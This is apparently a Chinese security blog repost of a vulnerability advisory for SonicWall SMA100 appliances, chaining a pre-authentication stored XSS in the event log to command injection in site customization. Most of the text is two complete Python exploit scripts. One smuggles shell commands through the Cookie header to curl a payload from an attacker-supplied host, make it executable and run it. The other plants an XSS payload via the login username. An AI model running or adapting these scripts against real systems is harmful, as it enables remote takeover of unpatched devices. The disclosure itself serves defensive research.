#  SonicWallSMA100将XSS存储到RCE   
 船山信安   2024-08-16 05:00  
  
概要  
  
SonicWall SMA100 中存在身份验证前存储的 XSS 和身份验证后的远程命令注入漏洞。这些漏洞允许未经身份验证的攻击者在经过身份验证的用户暴露于存储的 XSS 时执行任意命令。这些漏洞是在没有任何CVE分配的情况下悄无声息地修补的。删除了存在存储 XSS 漏洞的名为经典模式的整个功能，并添加了新的用户输入过滤代码来防止命令注入漏洞。   
  
供应商响应  
  
供应商已经发布了 SonicWall SMA100 10.2.1.10，它完全删除了经典模式，该模式消除了上述漏洞  
  
受影响的版本  
  
SonicWall SMA100版本及10.2.1.9以前的版本   
  
**技术分析**  
  
存储XSS  
cgi-bin\eventlog中存在一个存储的预认证XSS漏洞。当cgi-bin\eventlog从该文件解析日志时，会触发此漏洞。通过运行cgi-bin\eventlog，日志/查看页面显示时间、优先级、类别、源、目标、用户、消息:![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicPxCl4h0S2kOsKd9TL1wHcn0MrlBgPEY6fh7M3ClcJWrJjq9wgragj7XcOgTVvyQ24Hqhm02P05sw/640?wx_fmt=png&from=appmsg "")  
  
  
它们保存在/var/log/eventlog中，例如:  
```
sh-4.2# cat /var/log/eventlog 
Dec 25 04:44:54 sslvpn SSLVPN: id=sslvpn sn=Unknown time="2022-12-25 04:44:54" vp_time="2022-12-25 12:44:54 UTC" fw=192.168.1.1 pri=5 m=0 c=700 src=192.168.1.10 dst=192.168.1.1 user="admin@LocalDomain" usr="admin@LocalDomain" msg="Log cleared" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
Dec 25 04:44:58 sslvpn SSLVPN: id=sslvpn sn=Unknown time="2022-12-25 04:44:58" vp_time="2022-12-25 12:44:58 UTC" fw=192.168.1.1 pri=5 m=2 c=2 src=192.168.1.10 dst=192.168.1.1 user="admin@LocalDomain" usr="admin@LocalDomain" msg="User logged out" active=112 duration=115 agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
Dec 25 04:45:01 sslvpn SSLVPN: id=sslvpn sn=Unknown time="2022-12-25 04:45:01" vp_time="2022-12-25 12:45:01 UTC" fw=192.168.1.1 pri=5 m=1 c=1 src=192.168.1.10 dst=192.168.1.1 user="admin@LocalDomain" usr="admin@LocalDomain" msg="User login successful" portal="VirtualOffice" domain="LocalDomain" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
```  
  
  
分隔符是\x20，并且不对任何字符进行过滤。通过在登录时将(x20输入到用户名中，我能够做一些有趣的事情。用户输入保存到var/log/evenlog中，而cgi-bin/evenlog则解析并显示给登录用户  
  
在分析cgi-bin/eventlog时，我找到了ACCEPT BY TABLES。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicPxCl4h0S2kOsKd9TL1wHcnHTAonnibZolGXcpHOic2ZqcfyicMzB9DaJWY8ty3vccs82x13REap3MUg/640?wx_fmt=png&from=appmsg "")  
  
  
它允许恶意载荷打印在日志视图上。  
  
命令注入  
  
cgi-bin/sitecustomization中存在一个命令注入漏洞，我们可以在 portalname中输入有效载荷。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicPxCl4h0S2kOsKd9TL1wHcnpud0MHnAC3zxNn5ZiaQ30Ov5Mh97m3ZHXhpEagZjhzDgKwp4T8t46AQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/7nIrJAgaibicPxCl4h0S2kOsKd9TL1wHcn7MzngOdYOAoKb6ujjzL869KSLAQrShfNfCGrYvdjekFKzgs3VFIozg/640?wx_fmt=gif&from=appmsg "")  
  
Exploit  
```
import requests
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
host = "{HOST}"
class SonicWall:
    def __init__(self, args):
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
        }
        self.s = requests.Session()
        self.s.verify = False
        self.username = args.username
        self.password = args.password
        self.rhost = args.rhost
        self.root_url = args.host
        if not args.host.startswith("http"):
            self.root_url = f"https://{args.host}/"
        if not self.root_url.endswith("/"):
            self.root_url += "/"
    def http_get(self, path, params=None, headers={}):
        url = self.root_url + path
        headers.update(self.headers)
        r = requests.Request(method="GET", url=url, params=params, headers=headers)
        prep = r.prepare()
        prep.url = url
        res = self.s.send(prep)
        return res
    def http_post(self, path, data, headers={}):
        url = self.root_url + path
        headers.update(self.headers)
        r = requests.Request(method="POST", url=url, data=data, headers=headers)
        prep = r.prepare()
        prep.url = url
        res = self.s.send(prep)
        return res
    def login(self):
        data = {
            "username": self.username,
            "password": self.password,
            "domain": "LocalDomain",
            "loginButton": "Login",
            "state": "login",
            "login": "true",
            "verifyCert": "0",
            "portalname": "VirtualOffice",
            "loginToken": "",
            "ajax": "true",
        }
        res = self.http_post("/cgi-bin/userLogin", data=data)
        if '"status":"success"' not in res.text:
            return False
        if "Set-Cookie" not in res.headers:
            return False
        self.headers["Cookie"] = res.headers["Set-Cookie"]
        return True
    def get_csrf_token(self):
        res = self.http_get("/cgi-bin/users")
        if 'var tokenValue = "' not in res.text:
            return None
        token = res.text.split('var tokenValue = "')[1].split('"')[0]
        return token
    def command(self, cmd, csrf_token):
        portalname = "$($HTTP_COOKIE)"
        portalUrl = "/"
        vhostName = "vhostName"
        data = {
            "portalname": portalname,
            "portaltitle": "Virtual Office",
            "bannertitle": "Virtual Office",
            "bannermessage": "",
            "portalUrl": portalUrl,
            "httpOnlyCookieFlag": "on",
            "cachecontrol": "on",
            "uniqueness": "on",
            "duplicateLoginAction": "1",
            "livetilesmalllogo": "",
            "livetilemediumlogo": "",
            "livetilewidelogo": "",
            "livetilelargelogo": "",
            "livetilebackground": "#0085C3",
            "livetilename": "",
            "home2page": "on",
            "allowNetExtender": "on",
            "virtualpassagepage": "on",
            "cifsdirectpage": "on",
            "cifspage": "on",
            "cifsdefaultfilesharepath": "",
            "home3page": "on",
            "showAllBookmarksTab": "on",
            "showDefaultTabs": "on",
            "showCopyright": "on",
            "showSidebar": "on",
            "showUserPortalHelpButton": "on",
            "userPortalHelpURL": "",
            "showUserPortalOptionsButton": "on",
            "showUserPortalDownloadsButton": "on",
            "homemessage": "<h1>Welcome to the SonicWall Virtual Office</h1><p>SonicWall Virtual Office provides easy and secure remote access to the corporate network from anywhere on the Internet.</p><p>Click a pre-defined bookmark or create your own to securely access a corporate network resource.</p><p>Launch NetExtender to create a secure network connection to the corporate network for full network access.</p>",
            "hptabletitle": "Virtual Office Bookmarks",
            "vhostName": vhostName,
            "vhostAlias": "",
            "vhostHTTPSPort": "",
            "vhostInterface": "ALL",
            "vhostCert": "default",
            "vhostEnableKeepAlive": "on",
            "cdssodn": "",
            "enableSSLProxyVerify": "0",
            "sslProxyProtocol": "0",
            "loginSchedule": (
                "000000000000000000000000000000000000000"
                "000000000000000000000000000000000000000"
                "000000000000000000000000000000000000000"
                "000000000000000000000000000000000000000"
                "000000000000"
            ),
            "formsection": "main",
            "doAdd": "1",
            "cgiaction": "1",
            "themename": "stylesonicwall",
            "onlinehelp": "",
            "tmp_currentVhostName": "",
            "tmp_currentVhostAlias": "",
            "tmp_currentVhostHTTPSPort": "0",
            "tmp_currentVhostInterface": "ALL",
            "tmp_currentVhostIp": "",
            "tmp_currentVhostIPv6": "",
            "tmp_currentVhostEnableCertCheck": "0",
            "tmp_currentVhostEnableHTTP": "0",
            "tmp_currentVhostEnableKeepAlive": "1",
            "tmp_currentVhostCert": "",
            "tmp_currEnforceSSLProxyProtocol": "0",
            "tmp_currSSLProxyProtocol": "0",
            "tmp_currEnableSSLProxyVerify": "0",
            "tmp_currEnableSSLForwardSecrecy": "0",
            "tmp_currentVhostOffloadRewrite": "",
            "tmp_currentHSTSFlag": "0",
            "restartWS": "1",
            "reuseFavicon": "",
            "oldReuseFavicon": "",
            "swcctn": csrf_token,
        }
        backup_cookie = self.headers["Cookie"]
        self.headers["Cookie"] = f"{cmd} ; exit ; " + backup_cookie
        res = self.http_post("/cgi-bin/sitecustomization", data=data)
        if (
            "Virtual Host Name not set - A Portal with the same virtual host name already exists."
            in res.text
        ):
            print("[-] failed: duplicated name")
            return False
        self.headers["Cookie"] = backup_cookie
        data = {"delete": portalname, "swcctn": csrf_token}
        res = self.http_post("/cgi-bin/portallist", data=data)
        if portalname in res.text:
            print("[-] failed: deleting name")
            return False
        return True
    def run(self):
        print("[+] login")
        is_login = self.login()
        print(f"    result: {is_login}")
        if not is_login:
            return
        print("[+] csrf token")
        csrf_token = self.get_csrf_token()
        print(f"    {csrf_token}")
        print("[+] saving payload into target")
        self.command(f"curl -o /tmp/c {self.rhost}", csrf_token)
        if self.command(f"curl -o /tmp/c {self.rhost}", csrf_token) and self.command(
            "chmod 777 /tmp/c", csrf_token
        ):
            print("    success")
        print("[+] execute")
        if self.command("/tmp/c", csrf_token):
            print("    success")
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SonicWall SMA Exploit")
    parser.add_argument("host", type=str, help="victim host")
    parser.add_argument("rhost", type=str, help="reverse host (http/https uri)")
    parser.add_argument("username", type=str, help="username")
    parser.add_argument("password", type=str, help="password")
    args = parser.parse_args()
    e = SonicWall(args)
    e.run()

```  
```
import requests
import json
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
class SonicWall:
    def __init__(self, args):
        self.s = requests.Session()
        self.s.verify = False
        self.rhost = args.rhost
        self.root_url = args.host
        if not args.host.startswith("http"):
            self.root_url = f"https://{args.host}/"
        if not self.root_url.endswith("/"):
            self.root_url += "/"
    def http_post(self, path, data, headers={}):
        url = self.root_url + path
        r = requests.Request(method="POST", url=url, data=data, headers=headers)
        prep = r.prepare()
        prep.url = url
        res = self.s.send(prep)
        return res
    def run(self):
        payload = f"<img/src=STOREDXSS>"
        assert len(payload) < 64
        print("[+] send payload")
        data = {
            "username": f"c=1003 ACCEPT_BY_IPTABLES SRC={payload} ",
            "password": "password",
            "domain": "LocalDomain",
            "loginButton": "Login",
            "state": "login",
            "login": "true",
            "verifyCert": "0",
            "portalname": "VirtualOffice",
            "loginToken": "",
            "ajax": "true",
        }
        path = f"cgi-bin/userLogin"
        res = self.http_post(path, data=data)
        print(res.text)
        print("    complete")
if __name__ == "__main__":
    with open("config.json", "r") as f:
        config = f.read()
    config = json.loads(config)
    parser = argparse.ArgumentParser(description="SonicWall SMA Exploit")
    parser.add_argument(
        "--host", type=str, help="victim host", default=config["target"]
    )
    parser.add_argument(
        "--rhost",
        type=str,
        help="reverse host (http/https uri)",
        default=config["xss_url"],
    )
    args = parser.parse_args()
    e = SonicWall(args)
    e.run()
```  
  
转载自:https://ssd-disclosure.com/ssd-advisory-sonicwall-sma100-stored-xss-to-rce/  
  
